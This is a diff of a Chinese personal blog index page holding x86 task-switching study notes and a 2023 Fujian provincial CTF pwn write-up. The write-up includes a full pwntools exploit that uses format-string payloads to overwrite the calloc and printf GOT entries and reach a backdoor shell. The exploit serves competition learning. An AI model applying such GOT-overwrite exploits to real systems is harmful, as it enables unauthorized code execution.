+<h2 id="4-3-任务切换"><a href="#4-3-任务切换" class="headerlink" title="4.3. 任务切换"></a><strong><strong>4.3. 任务切换</strong></strong></h2><h3 id="•-什么时候发生任务切换？"><a href="#•-什么时候发生任务切换？" class="headerlink" title="• 什么时候发生任务切换？"></a>• 什么时候发生任务切换？</h3><ul>
+<li>当前程序、任务或过程对GDT中的TSS描述符执行JMP或CALL指令。</li>
+<li>当前程序、任务或过程对任务门描述符执行 JMP 或 CALL 指令GDT 或当前的 LDT。</li>
+<li>中断或异常向量指向 IDT 中的任务门描述符</li>
+<li>当前任务在设置 EFLAGS 寄存器中的 NT 标志时执行 IRET</li>
+</ul>
+<h3 id="•-发生任务切换时，处理器会执行哪些操作？"><a href="#•-发生任务切换时，处理器会执行哪些操作？" class="headerlink" title="• 发生任务切换时，处理器会执行哪些操作？"></a>• 发生任务切换时，处理器会执行哪些操作？</h3><ol>
+<li>从JMP或CALL指令的操作数、任务门或先前任务的链接字段（用于由IRET指令发起的任务切换）获取新任务的TSS段选择符。</li>
+<li>检查当前（旧）任务是否被允许切换到新任务。数据访问特权规则适用于JMP和CALL指令。当前（旧）任务的CPL和新任务的段选择符的RPL必须小于等于所引用的TSS描述符或任务门的DPL。但是，除了INT n指令生成的中断外，异常、中断和IRET指令可以无视目标任务门或TSS描述符的DPL来切换任务。对于由INT n指令生成的中断，会检查DPL。</li>
+<li>检查新任务的TSS描述符是否标记为存在且具有有效的限长（大于或等于67H）。</li>
+<li>检查新任务是否可用（通过调用、跳转、异常或中断）或繁忙（通过IRET返回）。</li>
+<li>检查当前（旧）TSS、新TSS以及任务切换中使用的所有段描述符是否已分页到系统内存中。</li>
+<li>如果任务切换是通过JMP或IRET指令发起的，处理器会清除当前（旧）任务的TSS描述符中的繁忙（B）标志；如果是通过CALL指令、异常或中断发起的，则保持繁忙（B）标志设置不变。</li>
+<li>如果任务切换是通过IRET指令发起的，处理器会清除暂时保存的EFLAGS寄存器图像中的NT标志；如果是通过CALL指令、JMP指令、异常或中断发起的，则保持暂时保存的EFLAGS图像中的NT标志不变。</li>
+<li>将当前（旧）任务的状态保存到当前任务的TSS中。处理器根据任务寄存器中的当前TSS的基址，将以下寄存器的状态复制到当前TSS中：所有通用寄存器，来自段寄存器的段选择符，暂时保存的EFLAGS寄存器图像以及指令指针寄存器（EIP）。</li>
+<li>如果任务切换是通过CALL指令、异常或中断发起的，处理器将在从新任务加载的EFLAGS中设置NT标志。如果是通过IRET指令或JMP指令发起的，NT标志将反映从新任务加载的EFLAGS中的NT的状态。</li>
+<li>如果任务切换是通过CALL指令、JMP指令、异常或中断发起的，处理器会设置新任务的TSS描述符中的繁忙（B）标志；如果是通过IRET指令发起的，则保持繁忙（B）标志设置不变。</li>
+<li>将任务寄存器加载新任务TSS的段选择符和描述符。</li>
+<li>将TSS状态加载到处理器中。这包括LDTR寄存器、PDBR（控制寄存器CR3）、EFLAGS寄存器、EIP寄存器、通用寄存器和段选择符。在加载此状态的过程中发生故障可能会损坏体系结构状态。（如果未启用分页，会从新任务的TSS中读取PDBR值，但不会加载到CR3中。）</li>
+<li>加载和验证与段选择符关联的描述符。与此加载和验证相关的任何错误都会在新任务的上下文中发生，并可能损坏体系结构状态。</li>
+<li>准备执行新任务。</li>
+</ol>
+<h3 id="•-中断或异常向量指向-IDT-表中的中断门或陷阱门，会发生任务切换吗？"><a href="#•-中断或异常向量指向-IDT-表中的中断门或陷阱门，会发生任务切换吗？" class="headerlink" title="• 中断或异常向量指向 IDT 表中的中断门或陷阱门，会发生任务切换吗？"></a>• 中断或异常向量指向 <code>IDT</code> 表中的中断门或陷阱门，会发生任务切换吗？</h3><p>中断或异常向量指向IDT表中的中断门或陷阱门时，一般情况下不会发生任务切换。任务切换通常是由任务门引起的，并且在通过任务门切换任务时，会执行任务状态的保存和加载操作。但有一种情况下，当通过中断指令（INT n）生成的中断向量引用一个任务门时，可能会发生任务切换。在这种情况下，会根据任务门描述符中的设置进行任务切换，并执行相应的任务。</p>
+<h2 id="4-4-任务链"><a href="#4-4-任务链" class="headerlink" title="4.4. 任务链"></a><strong><strong>4.4. 任务链</strong></strong></h2><h3 id="•-如何判断任务是否嵌套？"><a href="#•-如何判断任务是否嵌套？" class="headerlink" title="• 如何判断任务是否嵌套？"></a>• 如何判断任务是否嵌套？</h3><p>可以通过EFLAGS中的NT位来判断是否嵌套，如果是1则是嵌套的。</p>
+<h3 id="•-什么情况会发生任务嵌套？"><a href="#•-什么情况会发生任务嵌套？" class="headerlink" title="• 什么情况会发生任务嵌套？"></a>• 什么情况会发生任务嵌套？</h3><p>当新任务发生中断、异常、调用、陷阱等情况下会发生任务嵌套。</p>
+<h3 id="•-任务嵌套时修改了哪些标志位？"><a href="#•-任务嵌套时修改了哪些标志位？" class="headerlink" title="• 任务嵌套时修改了哪些标志位？"></a>• 任务嵌套时修改了哪些标志位？</h3><p>修改了EFLAGS中的NT位，设为了1。</p>
+<h3 id="•-任务嵌套时，如何返回前一任务？"><a href="#•-任务嵌套时，如何返回前一任务？" class="headerlink" title="• 任务嵌套时，如何返回前一任务？"></a>• 任务嵌套时，如何返回前一任务？</h3><p>如果软件使用 IRET 指令挂起新任务，处理器将检查 EFLAG。NT &#x3D; 1;然后它使用<br>“Previous Task Link”字段中的值以返回到上一个任务。</p>
+<h2 id="4-5-任务地址空间"><a href="#4-5-任务地址空间" class="headerlink" title="4.5. 任务地址空间"></a><strong><strong>4.5. 任务地址空间</strong></strong></h2><h3 id="•-什么是任务地址空间？"><a href="#•-什么是任务地址空间？" class="headerlink" title="• 什么是任务地址空间？"></a>• 什么是任务地址空间？</h3><p>指任务所能访问的各个段的集合。这些段包括在任务状态段 (TSS) 中引用的代码、数据、栈和系统段，以及任务代码中访问的其他段。这些段被映射到处理器的线性地址空间中，而线性地址空间又被映射到处理器的物理地址空间中（可以直接映射或通过分页实现）。</p>
+<h3 id="•-任务地址空间包括什么？"><a href="#•-任务地址空间包括什么？" class="headerlink" title="• 任务地址空间包括什么？"></a>• 任务地址空间包括什么？</h3><p>这些段包括在任务状态段 (TSS) 中引用的代码、数据、栈和系统段，以及任务代码中访问的其他段。</p>
+<h3 id="•-了解把任务映射到线性和物理地址空间的方法？"><a href="#•-了解把任务映射到线性和物理地址空间的方法？" class="headerlink" title="• 了解把任务映射到线性和物理地址空间的方法？"></a>• 了解把任务映射到线性和物理地址空间的方法？</h3><p>主要有两种方法</p>
+<ol>
+<li>在所有任务之间共享一个线性到物理地址空间映射：当未启用分页机制时，这是唯一的选择。在没有分页的情况下，所有的线性地址都映射到相同的物理地址。当启用分页机制后，可以通过使用一个页目录来实现所有任务共享的线性到物理地址空间映射。线性地址空间可以超过可用的物理空间，如果支持按需分页的虚拟内存。</li>
+<li>将每个任务拥有独立的线性地址空间，映射到物理地址空间：这种映射方式通过使用每个任务的不同页目录来实现。由于任务切换时会加载PDBR（控制寄存器CR3），因此每个任务可以有不同的页目录。这样，每个任务都可以拥有自己的线性地址空间，并将其映射到物理地址。</li>
+</ol>
+<h3 id="解任务逻辑地址空间，及如何在任务之间共享数据的方法？"><a href="#解任务逻辑地址空间，及如何在任务之间共享数据的方法？" class="headerlink" title="解任务逻辑地址空间，及如何在任务之间共享数据的方法？"></a>解任务逻辑地址空间，及如何在任务之间共享数据的方法？</h3><ol>
+<li>通过全局描述符表（GDT）中的段描述符实现数据段的共享：所有任务都必须能够访问GDT中的段描述符。如果GDT中的一些段描述符指向映射到所有任务共享的物理地址空间区域的线性地址空间段，那么所有任务都可以共享这些段中的数据和代码。</li>
+<li>通过共享的局部描述符表（LDT）实现数据段的共享：如果多个任务使用相同的LDT，即它们的TSS中的LDT字段指向同一个LDT，那么这些任务可以共享LDT中指向映射到物理地址空间共享区域的段的数据和代码。通过共享LDT实现的数据共享比通过GDT的方式更加灵活和有选择性，因为可以将共享限制在特定的任务之间，系统中的其他任务可能具有不同的LDT，不能访问共享段。</li>
+<li>通过映射到线性地址空间中相同地址的不同LDT的段描述符实现数据段的共享：如果线性地址空间的某个共享区域被映射到每个任务的物理地址空间的相同区域，那么这些段描述符可以使任务共享段。这些段描述符通常被称为别名。通过这种方式的共享更加有选择性，因为LDT中的其他段描述符可能指向独立的线性地址，不共享。</li>
+</ol>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2023/10/19/2023%E7%A6%8F%E5%BB%BA%E7%9C%81%E8%B5%9Bpwn-wp/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/header.png">
+      <meta itemprop="name" content="hkbin">
+      <meta itemprop="description" content="hkbin hkbin hkbin">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="hkbin的小博客~">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2023/10/19/2023%E7%A6%8F%E5%BB%BA%E7%9C%81%E8%B5%9Bpwn-wp/" class="post-title-link" itemprop="url">2023福建省赛pwn wp</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2023-10-19 22:35:05 / 修改时间：22:40:15" itemprop="dateCreated datePublished" datetime="2023-10-19T22:35:05+08:00">2023-10-19</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/pwn/" itemprop="url" rel="index"><span itemprop="name">pwn</span></a>
+                </span>
+            </span>
+
+          <br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+              <span>378</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+              <span>1 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h2 id="漏洞点"><a href="#漏洞点" class="headerlink" title="漏洞点"></a>漏洞点</h2><p>漏洞点很多：</p>
+<p>格式化字符串漏洞</p>
+<p>后门</p>
+<p>泄露libc函数等</p>
+<p>不过值得一提的是 栈溢出是假的(那个函数返回地址由堆的一个东西管理</p>
+<h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>设定了函数call前RSP为0结尾，直接挟持got表改写后门函数会出现不对其错误</p>
+<p>所以我们可以挟持两个函数，分两个函数来打，可以优秀地控制栈帧</p>
+<p>这里挟持了一个冷门函数calloc的got表为backdoor的地址</p>
+<p>再挟持printf为call calloc的地址即可</p>
+<p>栈上的格式化字符串的打法比较简单，这里就不多说了</p>
+<p>用好fmtstr_payload可以事半功倍</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwncli <span class="keyword">import</span> gift</span><br><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line">context.terminal = [<span class="string">&quot;tmux&quot;</span>,<span class="string">&quot;splitw&quot;</span>,<span class="string">&quot;-h&quot;</span>]</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line"></span><br><span class="line">filename = <span class="string">&quot;./pwn&quot;</span></span><br><span class="line">libc_name = <span class="string">&quot;&quot;</span></span><br><span class="line">remote_ip = <span class="string">&quot;&quot;</span></span><br><span class="line">remote_port = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># libc = ELF(libc_name)</span></span><br><span class="line"></span><br><span class="line">mode = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">s = <span class="keyword">lambda</span> x: p.send(x)</span><br><span class="line">r = <span class="keyword">lambda</span> x: p.recv(x)</span><br><span class="line">ra = <span class="keyword">lambda</span>: p.recvall()</span><br><span class="line">rl = <span class="keyword">lambda</span>: p.recvline(keepends=<span class="literal">True</span>)</span><br><span class="line">ru = <span class="keyword">lambda</span> x: p.recvuntil(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: p.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> x, y: p.sendafter(x, y)</span><br><span class="line">sla = <span class="keyword">lambda</span> x, y: p.sendlineafter(x, y)</span><br><span class="line">ia = <span class="keyword">lambda</span>: p.interactive()</span><br><span class="line">c = <span class="keyword">lambda</span>: p.close()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> mode:</span><br><span class="line">    p = remote(remote_ip, remote_port)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = process(filename)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bpp</span>():</span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">log</span>(<span class="params">x</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\x1B[36m&#123;&#125;\x1B[0m&quot;</span>.<span class="built_in">format</span>(x))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">leak</span>():</span><br><span class="line">    leak_dat = ru(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:]</span><br><span class="line">    <span class="keyword">return</span> u64(leak_dat.ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">prefix = <span class="string">&quot;choose:&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Repeater</span>(<span class="params">payload</span>):</span><br><span class="line">    sla(prefix, <span class="built_in">str</span>(<span class="number">4294967293</span>))</span><br><span class="line">    sa(<span class="string">&quot;You find a Repeater!&quot;</span>, payload + <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">chance</span>(<span class="params">payload</span>):</span><br><span class="line">    sla(prefix, <span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    s(payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gift</span>():</span><br><span class="line">    sla(prefix, <span class="built_in">str</span>(<span class="number">10086</span>))</span><br><span class="line">    ru(<span class="string">&quot;Everyone is tired and reduces the workload!&quot;</span>)</span><br><span class="line"></span><br><span class="line">gift()</span><br><span class="line">rl()</span><br><span class="line">puts_got = <span class="built_in">int</span>(rl().decode()[:-<span class="number">1</span>], <span class="number">16</span>)</span><br><span class="line">log(<span class="built_in">hex</span>(puts_got))</span><br><span class="line"></span><br><span class="line">offset = <span class="number">6</span></span><br><span class="line">ret_addr = <span class="number">0x401522</span></span><br><span class="line">backdoor = <span class="number">0x401514</span></span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"></span><br><span class="line">pad = fmtstr_payload(offset, &#123;elf.got[<span class="string">&#x27;calloc&#x27;</span>]: backdoor&#125;)</span><br><span class="line"></span><br><span class="line">Repeater(pad)</span><br><span class="line"></span><br><span class="line">pad = fmtstr_payload(offset, &#123;elf.got[<span class="string">&#x27;printf&#x27;</span>]: <span class="number">0x40153D</span>&#125;)</span><br><span class="line"></span><br><span class="line">bpp()</span><br><span class="line">Repeater(pad)</span><br><span class="line"><span class="comment"># bpp()</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># rl()</span></span><br><span class="line"><span class="comment"># raw = rl()</span></span><br><span class="line"><span class="comment"># log(raw)</span></span><br><span class="line"></span><br><span class="line">ia()</span><br></pre></td></tr></table></figure>
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
     <link itemprop="mainEntityOfPage" href="http://example.com/2023/10/17/2023-%E9%A6%99%E5%B1%B1%E6%9D%AFpwn-wp/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1130,465 +1649,6 @@
   
   
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2023/09/30/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B002/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/header.png">
-      <meta itemprop="name" content="hkbin">
-      <meta itemprop="description" content="hkbin hkbin hkbin">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="hkbin的小博客~">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2023/09/30/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B002/" class="post-title-link" itemprop="url">操作系统读书笔记02</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-              
-
-              <time title="创建时间：2023-09-30 21:10:15 / 修改时间：21:12:48" itemprop="dateCreated datePublished" datetime="2023-09-30T21:10:15+08:00">2023-09-30</time>
-            </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/" itemprop="url" rel="index"><span itemprop="name">操作系统</span></a>
-                </span>
-            </span>
-
-          <br>
-            <span class="post-meta-item" title="本文字数">
-              <span class="post-meta-item-icon">
-                <i class="far fa-file-word"></i>
-              </span>
-              <span>1.9k</span>
-            </span>
-            <span class="post-meta-item" title="阅读时长">
-              <span class="post-meta-item-icon">
-                <i class="far fa-clock"></i>
-              </span>
-              <span>7 分钟</span>
-            </span>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h1 id="os读书笔记2"><a href="#os读书笔记2" class="headerlink" title="os读书笔记2"></a>os读书笔记2</h1><h1 id="保护模式内存管理"><a href="#保护模式内存管理" class="headerlink" title="保护模式内存管理"></a>保护模式内存管理</h1><h2 id="2-1-内存管理概览"><a href="#2-1-内存管理概览" class="headerlink" title="2.1. 内存管理概览"></a><strong><strong>2.1. 内存管理概览</strong></strong></h2><p><img src="/./images/065-read02/Untitled.png" alt="Untitled"></p>
-<p>有三种地址</p>
-<ul>
-<li>逻辑地址</li>
-<li>线性地址</li>
-<li>物理地址</li>
-</ul>
-<p>逻辑地址由一个16位的段选择符和一个32位的偏移量offset组成，对CPU来说每一个操作都是由逻辑地址来协助完成的。</p>
-<p>通过段选择符，找到目标段，再加上偏移量找到线性地址，线性地址即程序运行时候的虚拟地址。</p>
-<p><img src="/./images/065-read02/Untitled%201.png" alt="Untitled"></p>
-<p>线性地址的一些标志位会记录这些页的权限。</p>
-<p>最后线性地址分为三部分Dir、Table、Offset三个部分分别用于查找Page Directionary、Page Table，最后结合offset可以找到具体的物理地址。</p>
-<p>通过三个地址，实现了由CPU到物理地址的访问流程，中间经历了许多表，这些操作都是为了扩大访问范围，以少量的总线访问大量的存储空间。</p>
-<h2 id="2-2-分段机制"><a href="#2-2-分段机制" class="headerlink" title="2.2.分段机制"></a>2.2.分段机制</h2><h3 id="Basic-Flat-Model"><a href="#Basic-Flat-Model" class="headerlink" title="Basic Flat Model"></a>Basic Flat Model</h3><p>这个模型是最直白的模型，也就是没有经历我们上述的分段、分页的转换等流程，CPU直接访问的就是物理内存，一对一映射。</p>
-<p><img src="/./images/065-read02/Untitled%202.png" alt="Untitled"></p>
-<p>在这个模型中我们仍需要建立至少两个段描述符，代码段和数据段，并且两个段都要映射进内存空间。</p>
-<h3 id="Protected-Flat-Model"><a href="#Protected-Flat-Model" class="headerlink" title="Protected Flat Model"></a>Protected Flat Model</h3><p>这个模型下，段长被限制在一定范围内，不允许出现越界访问等问题。</p>
-<p><img src="/./images/065-read02/Untitled%203.png" alt="Untitled"></p>
-<p>它将代码段&#x2F;数据段&#x2F;堆栈段等写在特定的地方，不允许例如代码段的段描述符访问到数据段这种情况，对内存进行了隔离和保护，是一种内存管理和保护的理论模型，通过划分地址空间为多个区域并设置不同的访问权限，实现进程间的内存隔离和保护。</p>
-<p>但是不同程序之间能够相互访问数据，不存在互锁的情况。</p>
-<h3 id="Multi-Segment-Model"><a href="#Multi-Segment-Model" class="headerlink" title="Multi-Segment Model"></a>Multi-Segment Model</h3><p><img src="/./images/065-read02/Untitled%204.png" alt="Untitled"></p>
-<p>这个模型下，充分利用了分段机制，提供了对代码、数据、堆栈的一种更高级的保护，每个进程都拥有独自分配到的段，也可以与别的进程共享这些段。防止了不同程序之间越界访问。</p>
-<h2 id="2-3-逻辑地址和线性地址的转换"><a href="#2-3-逻辑地址和线性地址的转换" class="headerlink" title="2.3. 逻辑地址和线性地址的转换"></a><strong><strong>2.3. 逻辑地址和线性地址的转换</strong></strong></h2><h3 id="段选择子结构"><a href="#段选择子结构" class="headerlink" title="段选择子结构"></a>段选择子结构</h3><p><img src="/./images/065-read02/Untitled%205.png" alt="Untitled"></p>
-<p>段选择子长度为16bits，其低位3bits是标志位</p>
-<p>RPL标志位占2bits，表示请求段的特权级</p>
-<p>这里的特权级就是Ring0-Ring3，也就是内核态特权和用户态特权，越权访问会被禁止</p>
-<p>TI标志位表示要给到的表是GDT还是LDT</p>
-<p>Index是表中的下标，可以访问8192个，但是GDT的第0位是置空的，所以在GDT只能访问8191个段描述符。</p>
-<h3 id="段寄存器"><a href="#段寄存器" class="headerlink" title="段寄存器"></a>段寄存器</h3><p>处理器提供了6个段寄存器，代码寄存器(CS)，数据段寄存器(DS)，堆栈段寄存器(SS)，以及另外三个数据段寄存器(ES、FS和GS)给进程使用。</p>
-<p><img src="/./images/065-read02/Untitled%206.png" alt="Untitled"></p>
-<p>每个段寄存器都由两部分组成，一部分是程序员可见，另外一部分是不可见的。</p>
-<p>不可见部分包括了段基址、段限长和访问权限。</p>
-<p>载入段寄存器一般有两种指令：</p>
-<ol>
-<li>直接载入指令，如：MOV，POP，LDS，LES，LSS，LGS和LFS，这些指令明确指定了相应的寄存器。</li>
-<li>隐含的载入指令，比如CALL，JMP，RET等指令，伴随着这些指令，改变了CS寄存器的内容，有时候也会改变别的寄存器的内容。</li>
-</ol>
-<h3 id="段描述子"><a href="#段描述子" class="headerlink" title="段描述子"></a>段描述子</h3><p><img src="/./images/065-read02/Untitled%207.png" alt="Untitled"></p>
-<p>结构如图。</p>
-<h3 id="段基址"><a href="#段基址" class="headerlink" title="段基址"></a>段基址</h3><p>指向段在内存中的起始地址。处理器会将三个基地址组合在一起构成一个32位的地址。</p>
-<h3 id="类型域"><a href="#类型域" class="headerlink" title="类型域"></a>类型域</h3><p>指明段&#x2F;门的类型，会设定访问权限、或者门&#x2F;段的各种特点。</p>
-<h3 id="S-描述符类型-标志"><a href="#S-描述符类型-标志" class="headerlink" title="S(描述符类型)标志"></a>S(描述符类型)标志</h3><p>确定段描述符是系统描述符(S标记为0)或者代码、数据段描述符(S标记为1)</p>
-<h3 id="DPL-描述符特权级-域"><a href="#DPL-描述符特权级-域" class="headerlink" title="DPL(描述符特权级)域"></a>DPL(描述符特权级)域</h3><p>指明该段的特权级。特权级从0～3，0为最高特权级。</p>
-<h3 id="P-段存在-标志"><a href="#P-段存在-标志" class="headerlink" title="P(段存在)标志"></a>P(段存在)标志</h3><p>标志指出该段当前是否在内存中（1表示在内存中，0表示不在）。当指向该段描述符的<br>段选择符装载人段寄存器时，如果这个标志为0，处理器会产生一个段不存在异常（NP）。</p>
-<h3 id="D-B-默认操作数大小-默认栈指针大小和-或上限-标志"><a href="#D-B-默认操作数大小-默认栈指针大小和-或上限-标志" class="headerlink" title="D&#x2F;B(默认操作数大小&#x2F;默认栈指针大小和&#x2F;或上限)标志"></a>D&#x2F;B(默认操作数大小&#x2F;默认栈指针大小和&#x2F;或上限)标志</h3><p>根据这个段描述符所指的是一个可执行代码段，一个向下扩展的数据段还是一个堆栈<br>段，这个标志完成不同的功能。（对32位的代码和数据段，这个标志总是被置为1，而<br>16位的代码和数据段，这个标志总是被置为0）</p>
-<h3 id="G（粒度）标志"><a href="#G（粒度）标志" class="headerlink" title="G（粒度）标志"></a>G（粒度）标志</h3><p>确定段限长扩展的增量。当G标志为0，段限长以字节为单位；G标志为1，段限长以4KB<br>为单位。（这个标志不影响段基址的粒度，段基址的粒度永远是字节）如果G标志为1，<br>那么当检测偏移量是否超越段限长时，不用测试偏移量的低12位。</p>
-<p>将逻辑地址转换成线性地址的，处理器：</p>
-<ol>
-<li>分段：处理器通过段选择子和段描述符将逻辑地址中的段部分与段基址相对应起来。段基址表示段的起始地址，段选择子包含了段的索引和特权级等信息。</li>
-<li>分页：在分段的基础上，处理器使用页表将逻辑地址中的页部分转换成物理地址的页表项索引，并获取对应的页表项。</li>
-<li>偏移计算：根据逻辑地址中的段内偏移部分和获取的页表项中的页框基址，通过加法运算得出线性地址的偏移部分。</li>
-<li>线性地址生成：将分段的段基址与偏移计算得到的线性地址偏移部分相加，即可得到线性地址。</li>
-</ol>
-<h2 id="2-4-描述符的分类"><a href="#2-4-描述符的分类" class="headerlink" title="2.4. 描述符的分类"></a><strong><strong>2.4. 描述符的分类</strong></strong></h2><p><strong>代码段&#x2F;数据段描述符</strong>：</p>
-<p><img src="/./images/065-read02/Untitled%208.png" alt="Untitled"></p>
-<p>当段描述符中的S标志（描述符类型）为1时，该描述符为代码段描述符或者数据段描述符。<br>类型域的最高位（段描述符的第二个双字的第11位）将决定该描述符为数据段描述符（为0）<br>或者代码段描述符（为1）。<br>对于数据段而言，描述符的类型域的低3位（位8，9，10）被解释为访问控制（A），是否<br>可写（W），扩展方向（E）。参考表3－1对代码和数据段描述符类型域的解码描述。数据<br>段可以是只读或者可读写的段，这取决与“是否可写”标志。</p>
-<p><strong>系统描述符</strong>:</p>
-<p>系统描述符分为：</p>
-<ul>
-<li>局部描述符表（LDT）段描述符</li>
-<li>任务状态段（TSS）描述符</li>
-<li>调用门描述符</li>
-<li>中断门描述符</li>
-<li>陷阱门描述</li>
-<li>任务门描述符</li>
-</ul>
-<p>这些描述符又可以分为两类：系统段描述符和门描述符。系统段描述符指向系统段（LDT<br>和TSS段）。门描述符它们自身就是“门“，它们或者持有指向在代码段的过程的入口点</p>
-<p>的指针，或者持有TSS（任务门）的段选择符。</p>
-<p><img src="/./images/065-read02/Untitled%209.png" alt="Untitled"></p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2023/09/30/%E5%85%B3%E9%97%ADaslr%E8%BF%9B%E8%A1%8C%E8%B0%83%E8%AF%95/">
-
